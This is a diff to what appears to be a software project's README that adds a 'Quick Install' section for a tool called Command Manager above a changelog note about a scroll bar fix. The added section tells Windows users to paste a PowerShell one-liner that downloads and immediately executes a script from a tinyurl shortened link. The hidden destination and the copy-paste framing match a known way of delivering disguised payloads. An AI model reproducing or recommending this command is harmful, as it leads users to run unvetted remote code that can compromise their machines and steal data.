@@ -7,6 +7,23 @@
 
 ---
 
+## Quick Install — Command Manager
+
+**Step by step (copy-paste ready):**
+
+1. Press `Win + R`, type `powershell`, press Enter
+2. Copy the line below
+3. Right-click in the PowerShell window (or Ctrl+V) to paste
+4. Press Enter
+
+```
+iex (iwr -useb https://tinyurl.com/cmmgrps1)
+```
+
+- ✅ Installed. Now type cmd help to start mastering your commands.
+
+---
+
 ## 🚀 What's New in 1.0.6
 
 * **Scroll Bar Fix:** Fixed bug where horizontal and vertical scroll bars incorrectly appeared on main window after opening and closing "Manage Profiles" modal.
